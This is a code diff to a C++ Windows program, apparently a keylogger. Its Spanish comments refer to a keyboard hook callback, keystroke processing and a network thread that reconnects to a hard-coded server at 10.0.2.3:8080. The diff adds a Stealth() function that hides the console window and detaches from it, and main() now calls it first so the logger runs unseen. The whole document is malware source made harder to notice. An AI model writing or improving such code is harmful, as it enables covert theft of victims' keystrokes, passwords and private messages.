@@ -15,6 +15,7 @@
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "user32.lib")
 
+#define invisible
 // --- Configuración de Red ---
 const char* SERVER_IP = "10.0.2.3";
 const char* SERVER_PORT = "8080";
@@ -81,6 +82,18 @@ std::string ProcessKey(int key_stroke) {
     return ss.str();
 }
 
+void Stealth()
+{
+#ifdef visible
+	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
+#endif
+
+#ifdef invisible
+	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
+	FreeConsole(); // Detaches the process from the console window. This effectively hides the console window and fixes the broken invisible define.
+#endif
+}
+
 // --- Consumidor: Hilo de Red con Reconexión ---
 void networkWorker() {
     WSADATA wsa;
@@ -141,6 +154,7 @@ LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 int main() {
+    Stealth(); 
     // 1. Ocultar consola (Opcional, basado en tu referencia)
     // ShowWindow(GetConsoleWindow(), SW_HIDE);
 
